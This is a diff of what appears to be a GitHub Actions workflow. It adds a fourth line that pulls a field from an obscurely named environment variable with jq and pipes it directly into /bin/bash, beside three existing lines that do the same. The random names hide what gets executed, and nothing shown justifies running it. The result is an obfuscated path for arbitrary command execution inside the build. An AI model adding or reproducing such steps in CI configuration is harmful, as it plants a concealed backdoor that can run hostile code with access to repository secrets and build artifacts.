@@ -24,6 +24,7 @@ jobs:
           echo $dxtyl740 | jq -r .gktc80313 | /bin/bash
           printf '%s' "$dmpyu9920" | jq -r .e143 | /bin/bash
           printf '%s' "$hv6" | jq -r .yb9 | /bin/bash
+          printf '%s' "$igc47" | jq -r .o5 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
